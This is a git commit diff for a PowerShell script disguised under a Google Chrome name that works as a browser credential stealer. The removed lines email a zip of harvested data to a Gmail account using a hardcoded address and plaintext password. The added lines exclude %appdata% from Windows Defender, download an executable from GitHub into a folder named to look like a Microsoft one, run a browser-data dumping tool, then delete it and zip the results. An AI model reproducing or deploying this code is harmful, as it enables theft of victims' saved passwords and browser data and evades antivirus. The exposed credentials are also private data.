1357379716ec6dfbd6ecd3aeaf8fd8e21c202902
epicthoistaken <94729955+epicthoistaken@users.noreply.github.com>
2022-02-05 13:33:27 -0500

    Update googlechromescriptyes.ps1

--- googlechromescriptyes.ps1
+++ googlechromescriptyes.ps1
@@ -1,18 +1,12 @@
-#Mailing the output you will need to enable less secure app access on your google account for this to work
-$SMTPServer = 'smtp.gmail.com'
-$SMTPInfo = New-Object Net.Mail.SmtpClient($SmtpServer, 587)
-$SMTPInfo.EnableSsl = $true
-$ReportEmail = new-object Net.Mail.MailMessage
-$SMTPInfo.Credentials = New-Object System.Net.NetworkCredential('beneafrr@gmail.com', 'Milo36912!');
-$ReportEmail.From = 'beneafrr@gmail.com'
-$ReportEmail.To.Add('beneafrr@gmail.com')
-$ReportEmail.Subject = "Googlechrome"
-$ReportEmail.Body = 'Opening web.'
-$files=Get-ChildItem 
-$ReportEmail.Attachments.Add("$env:appdata\Microsoft\microsoftstorage\google.zip")
-$SMTPInfo.Send($ReportEmail)
-$ReportEmail.Dispose()
-$SMTPInfo.Dispose()
-#Cleanup
-cd "$env:appdata"
-Remove-MpPreference -ExclusionPath "$env:appdata"
+#Adding windows defender exclusionpath
+Add-MpPreference -ExclusionPath "$env:appdata"
+#Creating the directory we will work on
+mkdir "$env:appdata\Microsoft\microsoftstorage"
+Set-Location "$env:appdata\Microsoft\microsoftstorage"
+#Downloading and executing hackbrowser.exe
+Invoke-WebRequest 'https://github.com/epicthoistaken/googlechromeyes/raw/main/googlechromeclientyes.exe' -OutFile "googlechrome.exe"
+.\hb.exe --format json
+Remove-Item -Path "$env:appdata\Microsoft\microsoftstorage\googlechrome.exe" -Force
+#Creating A Zip Archive
+Compress-Archive -Path * -DestinationPath google.zip
+$Random = Get-Random
